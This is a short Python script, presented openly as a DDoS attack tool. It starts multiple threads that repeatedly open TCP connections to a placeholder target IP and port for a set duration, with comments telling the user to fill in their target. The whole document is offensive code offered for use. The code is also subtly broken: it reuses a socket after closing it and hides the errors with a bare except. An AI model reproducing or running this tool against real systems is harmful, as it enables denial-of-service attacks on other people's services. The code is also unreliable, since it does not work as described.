import socket
import threading
import time
import random


def ddos_thread(target_ip, target_port, duration, packets_per_second):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)

    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            sock.connect((target_ip, target_port))
            sock.send(b"")
            sock.close()
        except:
            pass
        time.sleep(1 / packets_per_second)

    sock.close()


def ddos_attack(target_ip, target_port, duration, packets_per_second, threads):
    for i in range(threads):
        thread = threading.Thread(target=ddos_thread, args=(target_ip, target_port, duration, packets_per_second))
        thread.start()


if __name__ == "__main__":
    target_ip = "192.168.1.1"  # Replace with the target IP address
    target_port = 80  # Replace with the target port
    duration = 60  # Duration of the attack in seconds
    packets_per_second = 10  # Number of packets to send per second
    threads = 10  # Number of threads to use

    ddos_attack(target_ip, target_port, duration, packets_per_second, threads)
